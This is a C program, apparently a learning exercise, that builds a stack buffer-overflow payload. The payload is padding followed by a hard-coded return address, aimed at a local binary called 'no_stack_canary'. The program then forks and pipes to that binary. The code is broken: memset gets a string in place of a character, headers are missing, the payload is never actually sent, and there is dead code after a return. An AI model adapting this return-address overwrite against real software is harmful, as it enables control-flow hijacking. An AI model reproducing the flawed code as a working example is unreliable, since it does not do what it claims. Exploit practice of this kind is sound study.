#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>


int main() {  
    pid_t pid;  
    int status;  
    int fd[2];  
    const char *program = "./no_stack_canary";
    const size_t num = 0xc+8;
    uint64_t target_address = 0x0000000000401132;
    const size_t total_size = num+sizeof(target_address);
    char payload[total_size];

    memset(payload,"A",num);
    memcpy(payload+num,&target_address,sizeof(target_address));
    for (size_t i = 0; i < total_size; ++i) {  
        printf("%02x ", (unsigned char)payload[i]);  
    }  
    printf("\n");
    char buffer[1024];  
    ssize_t bytesRead;  
  

    if (pipe(fd) == -1) {  
        perror("pipe");  
        exit(EXIT_FAILURE);  
    }  
  

    pid = fork();  
    if (pid == -1) {  
        perror("fork");  
        exit(EXIT_FAILURE);  
    } else if (pid == 0) { // 子进程  
        // 关闭管道的读端  
         close(fd[0]);  
  
        // 将管道的写端重定向到标准输出  
        dup2(fd[1], STDOUT_FILENO);  
  
        // 关闭原始的文件描述符  
        close(fd[1]);  
  
        FILE *fp;    
  
    /* 打开一个进程并获取其标准输入流 */  
    fp = popen(program, "w");  
    if (fp == NULL) {  
        printf("无法运行命令\n" );  
        exit(1);  
    }  
  
    /* 向进程的标准输入写入数据 */  
    fprintf(fp, "test\n");  
  
    /* 关闭与进程的联系，这会发送一个EOF信号，使得进程知道输入已经结束 */  
    pclose(fp);  
  
    return 0;  
        // 如果execl返回，说明出错了  
        perror("execl");  
        exit(EXIT_FAILURE);  
    } else { // 父进程  
        // 关闭管道的写端  
        close(fd[1]);  
  
        // 将管道的读端重定向到标准输入  
        dup2(fd[0], STDIN_FILENO);  
  
        // 关闭原始的文件描述符  
        close(fd[0]);  
  
        // 发送payload到子进程的标准输入  
        write(STDOUT_FILENO, "test\n",5);  
  
        // 读取子进程的输出  
        bytesRead = read(STDIN_FILENO, buffer, sizeof(buffer) - 1);  
        if (bytesRead > 0) {  
            buffer[bytesRead] = '\0'; // 确保字符串以null字符结尾  
            printf("Received from child: %s\n", buffer);  
        }  
  
        // 等待子进程结束  
        waitpid(pid, &status, 0);  
    }  
  
}